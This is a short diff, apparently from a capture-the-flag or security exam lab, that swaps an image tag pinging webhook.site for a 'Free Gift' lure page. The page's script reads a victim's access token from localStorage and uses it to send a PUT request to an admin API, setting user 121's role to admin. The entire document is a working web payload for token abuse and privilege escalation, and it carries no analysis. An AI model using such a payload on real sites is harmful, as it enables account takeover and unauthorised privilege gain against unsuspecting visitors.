@@ -1,1 +1,27 @@
-<img src="https://webhook.site/64b963bc-2bfe-4ed0-aa14-b7b423f02b8c?ping=admin">
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Gift</title>
+</head>
+<body>
+  <h1>You won a free gift!</h1>
+
+  <script>
+    const token = localStorage.getItem('access_token');
+
+    fetch('https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/users/121', {
+      method: 'PUT',
+      headers: {
+        'Authorization': 'Bearer ' + token,
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify({
+        name: 'Victim',
+        email: 'victim@example.com',
+        role: 'admin'
+      })
+    });
+  </script>
+</body>
+</html>
